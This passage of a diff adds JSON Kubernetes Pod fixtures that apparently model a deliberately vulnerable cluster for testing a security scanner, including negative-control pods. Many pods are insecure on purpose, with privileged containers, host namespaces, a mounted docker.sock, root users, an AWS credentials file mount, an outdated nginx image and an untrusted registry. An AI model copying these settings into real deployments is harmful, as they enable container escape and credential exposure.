+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.20",
+    "podIPs": [
+     {
+      "ip": "10.244.0.20"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-sshd-vrgd62z4m8-mk6ls",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-sshd"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-sshd-vrgd62z4m8",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "command": [
+       "/usr/sbin/sshd",
+       "-D"
+      ]
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.21",
+    "podIPs": [
+     {
+      "ip": "10.244.0.21"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-bare-privileged-pod",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-bare-privileged-pod"
+    }
+   },
+   "spec": {
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "privileged": true
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ]
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-job-host-network-nhbdc",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-job-host-network"
+    },
+    "ownerReferences": [
+     {
+      "kind": "Job",
+      "name": "wl-job-host-network",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "hostNetwork": true,
+    "restartPolicy": "Never",
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.22",
+    "podIPs": [
+     {
+      "ip": "10.244.0.22"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-init-privileged-rnrwf4ttcc-42svm",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-init-privileged"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-init-privileged-rnrwf4ttcc",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "initContainers": [
+     {
+      "name": "init",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "privileged": true,
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.23",
+    "podIPs": [
+     {
+      "ip": "10.244.0.23"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-kitchen-sink-8k76gdlct8-c692d",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-kitchen-sink"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-kitchen-sink-8k76gdlct8",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:latest",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": false,
+       "capabilities": {},
+       "privileged": true,
+       "runAsUser": 0,
+       "runAsNonRoot": false
+      },
+      "volumeMounts": [
+       {
+        "name": "d",
+        "mountPath": "/var/run/docker.sock"
+       }
+      ]
+     }
+    ],
+    "hostPID": true,
+    "hostNetwork": true,
+    "hostIPC": true,
+    "volumes": [
+     {
+      "name": "d",
+      "hostPath": {
+       "path": "/var/run/docker.sock"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.24",
+    "podIPs": [
+     {
+      "ip": "10.244.0.24"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-host-port-w44sdncv9r-gvr8l",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-port"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-host-port-w44sdncv9r",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "ports": [
+       {
+        "containerPort": 8080,
+        "hostPort": 8080
+       }
+      ]
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.25",
+    "podIPs": [
+     {
+      "ip": "10.244.0.25"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-share-process-7jjlrt2vpp-v252q",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-share-process"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-share-process-7jjlrt2vpp",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "shareProcessNamespace": true,
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.26",
+    "podIPs": [
+     {
+      "ip": "10.244.0.26"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-no-security-context-qjnnmrnlw6-8zl97",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-no-security-context"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-no-security-context-qjnnmrnlw6",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.27",
+    "podIPs": [
+     {
+      "ip": "10.244.0.27"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-host-process-94c76sg467-dnfn4",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "wl-host-process"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-host-process-94c76sg467",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "windowsOptions": {
+        "hostProcess": true
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.28",
+    "podIPs": [
+     {
+      "ip": "10.244.0.28"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "wl-default-ns-hld8qb8qq2-lczlz",
+    "namespace": "default",
+    "labels": {
+     "app": "wl-default-ns"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "wl-default-ns-hld8qb8qq2",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.29",
+    "podIPs": [
+     {
+      "ip": "10.244.0.29"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "sec-env-secret-fl9qmk7mdx-jtsnj",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-env-secret"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "sec-env-secret-fl9qmk7mdx",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "env": [
+       {
+        "name": "DB_PASSWORD",
+        "valueFrom": {
+         "secretKeyRef": {
+          "name": "db-credentials",
+          "key": "password"
+         }
+        }
+       }
+      ]
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.30",
+    "podIPs": [
+     {
+      "ip": "10.244.0.30"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "sec-cloud-creds-7hkbdqxxqk-b4m7b",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "sec-cloud-creds"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "sec-cloud-creds-7hkbdqxxqk",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "c",
+        "mountPath": "/root/.aws/credentials",
+        "subPath": "credentials"
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "c",
+      "secret": {
+       "secretName": "aws-credentials"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.31",
+    "podIPs": [
+     {
+      "ip": "10.244.0.31"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "neg-secret-as-file-stswg62hkm-58tvn",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-secret-as-file"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "neg-secret-as-file-stswg62hkm",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      },
+      "volumeMounts": [
+       {
+        "name": "s",
+        "mountPath": "/etc/app/secrets",
+        "readOnly": true
+       }
+      ]
+     }
+    ],
+    "volumes": [
+     {
+      "name": "s",
+      "secret": {
+       "secretName": "db-credentials"
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.32",
+    "podIPs": [
+     {
+      "ip": "10.244.0.32"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "as-fanout-a-mz2x28bqsl-kv8sm",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-a"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "as-fanout-a-mz2x28bqsl",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "shared-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.33",
+    "podIPs": [
+     {
+      "ip": "10.244.0.33"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "as-fanout-b-dwqjxtr79g-bfwdk",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "as-fanout-b"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "as-fanout-b-dwqjxtr79g",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "shared-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.34",
+    "podIPs": [
+     {
+      "ip": "10.244.0.34"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "as-fanout-c-pggnbh98bb-mwmjv",
+    "namespace": "dvka-baseline",
+    "labels": {
+     "app": "as-fanout-c"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "as-fanout-c-pggnbh98bb",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "shared-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.35",
+    "podIPs": [
+     {
+      "ip": "10.244.0.35"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "neg-pair-a-4nj56zdndb-f87f5",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-a"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "neg-pair-a-4nj56zdndb",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "pair-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.36",
+    "podIPs": [
+     {
+      "ip": "10.244.0.36"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "neg-pair-b-s5ll7qdxqt-6n9v6",
+    "namespace": "dvka-secure",
+    "labels": {
+     "app": "neg-pair-b"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "neg-pair-b-s5ll7qdxqt",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "pair-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.37",
+    "podIPs": [
+     {
+      "ip": "10.244.0.37"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "gap-cve-image-krnch2f5ln-45bpq",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-cve-image"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "gap-cve-image-krnch2f5ln",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "nginx:1.14.0",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.38",
+    "podIPs": [
+     {
+      "ip": "10.244.0.38"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "gap-untrusted-registry-4fgztdx64m-kvdlf",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "gap-untrusted-registry"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "gap-untrusted-registry-4fgztdx64m",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.untrusted.invalid/team/app:2.0",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.39",
+    "podIPs": [
+     {
+      "ip": "10.244.0.39"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "ap-frontend-djt8xmmh7m-bz24k",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "ap-frontend"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "ap-frontend-djt8xmmh7m",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "ap-frontend-sa",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "privileged": true
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.40",
+    "podIPs": [
+     {
+      "ip": "10.244.0.40"
+     }
+    ],
+    "hostIP": "192.168.49.2"
+   }
+  },
+  {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "name": "prio-isolated-5l6wcsx8jb-mcrbl",
+    "namespace": "dvka-vuln",
+    "labels": {
+     "app": "prio-isolated"
+    },
+    "ownerReferences": [
+     {
+      "kind": "ReplicaSet",
+      "name": "prio-isolated-5l6wcsx8jb",
+      "controller": true
+     }
+    ]
+   },
+   "spec": {
+    "serviceAccountName": "default",
+    "automountServiceAccountToken": false,
+    "securityContext": {
+     "runAsNonRoot": true,
+     "runAsUser": 10001,
+     "seccompProfile": {
+      "type": "RuntimeDefault"
+     }
+    },
+    "containers": [
+     {
+      "name": "app",
+      "image": "registry.k8s.io/pause:3.9",
+      "securityContext": {
+       "allowPrivilegeEscalation": true,
+       "readOnlyRootFilesystem": true,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "privileged": true
+      },
+      "resources": {
+       "limits": {
+        "cpu": "250m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "64Mi"
+       }
+      }
+     }
+    ],
+    "nodeName": "worker-1"
+   },
+   "status": {
+    "phase": "Running",
+    "podIP": "10.244.0.41",
+    "podIPs": [
+     {
+      "ip": "10.244.0.41"
+     }
